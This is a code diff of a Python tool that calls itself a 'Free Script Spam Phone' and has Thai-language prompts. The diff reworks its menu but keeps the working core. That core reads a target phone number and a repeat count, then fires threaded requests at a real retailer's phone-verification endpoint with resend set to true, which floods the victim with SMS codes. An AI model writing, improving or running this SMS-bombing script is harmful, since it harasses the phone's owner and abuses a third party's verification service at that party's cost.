@@ -39,51 +39,79 @@ set_download_link("https://raw.githubusercontent.com/ZeroN2/auto-update-test/mai
 version = "1.2"
 api = "1"
 
-os.system("clear")
-os.system("figlet L i lJoiTXia")
-print(Fore.RED + "              Version Script : ",version)
-print(Fore.RED + "              Total Api : ",api)
-print(Fore.RED + "              Free Script Spam Phone")
-print("")
-print("")
+def main():
+	menu()
 
-choice = input(Fore.RED + "1 ==> Update Script \n2 ==> Run Script \n\nEnter Choice ==> ")
-choice = int(choice)
-
-
-
-
-if choice == 1:
+def menu():
 	os.system("clear")
-	print("กำลังโหลดอัพเดท...")
-	time.sleep(2)
-	download("main.py")
-	print("อัพเดทไฟล์เสร็จแล้ว...")
-	time.sleep(2)
-	os.system("clear && python3 main.py")
-elif choice == 2:
-	os.system("clear")
-	phone = input("Phone : ")
-	amount = input("Amount : ")
-	start = input("Enter To Start")
-	os.system("clear")
-	time.sleep(2)
-	print(f"เบอร์ที่ยิง : {phone}\nยิงทั้งหมด : {amount} รอบ")
-	time.sleep(1)
-	
-	
-	def run(phone, amount):
-		for _ in range(int(amount)):
-			threading.Thread(target=spam1(phone)).start()
+	print(Fore.RED + "")
+	os.system("figlet L i lJoiTXia")
+	print(Fore.RED + "              Version Script : ",version)
+	print(Fore.RED + "              Total Api : ",api)
+	print(Fore.RED + "              Free Script Spam Phone")
+	print("")
+	print("")
+	choice = input(Fore.RED + "1 ==> Update Script \n2 ==> Run Script \n\nEnter Choice ==> ")
+	choice = int(choice)
+	if choice == 1:
+		a = str(input("คุุณต้องการอัพเดทไฟล์หรือไม่ (y/n) \n==> : "))
+		if a.lower() in ['y','yes']:
+			os.system("clear")
+			print("กำลังโหลดอัพเดท...")
+			time.sleep(2)
+			print("อัพเดทไฟล์เสร็จแล้ว...")
+			time.sleep(2)
+			#download("main.py")
+			os.system("clear && python3 main.py")
+		elif a.lower() in ['n','no']:
+			os.system("clear")
+			menu()
+		else:
+			os.system("clear")
+			menu()
 			
 			
 			
-	def spam1(phone):
-		url = f"https://hdmall.co.th/phone_verifications?mobile={phone}&resend=true"
-		r = requests.get(url)
-		print("\rสถานะการร้องขอ api : ", r.status_code)
-
-	start = run(phone, amount)
-
+	elif choice == 2:
+		os.system("clear")
+		time.sleep(1)
+		print(Fore.RED + "")
+		os.system("figlet L i lJoiTXia")
+		print(Fore.RED + "              Version Script : ",version)
+		print(Fore.RED + "              Total Api : ",api)
+		print(Fore.RED + "              Free Script Spam Phone")
+		print("")
+		print("")
+		phone = input("Phone : ")
+		amount = input("Amount : ")
+		start = input("Enter To Start...")
+		os.system("clear")
+		time.sleep(1)
+		print(Fore.RED + "")
+		os.system("figlet L i lJoiTXia")
+		print(Fore.RED + "              Version Script : ",version)
+		print(Fore.RED + "              Total Api : ",api)
+		print(Fore.RED + "              Free Script Spam Phone")
+		print("")
+		print("")
+		time.sleep(2)
+		print(f"เบอร์ที่ยิง : {phone}\nยิงทั้งหมด : {amount} รอบ")
+		time.sleep(1)
+		
+		
+		def run(phone, amount):
+			for _ in range(int(amount)):
+				threading.Thread(target=spam1(phone)).start()
+				
+				
+				
+		def spam1(phone):
+			url = f"https://hdmall.co.th/phone_verifications?mobile={phone}&resend=true"
+			r = requests.get(url)
+			print("\rสถานะการร้องขอ api : ", r.status_code)
+	
+		start = run(phone, amount)
+	
 
 	
+main()
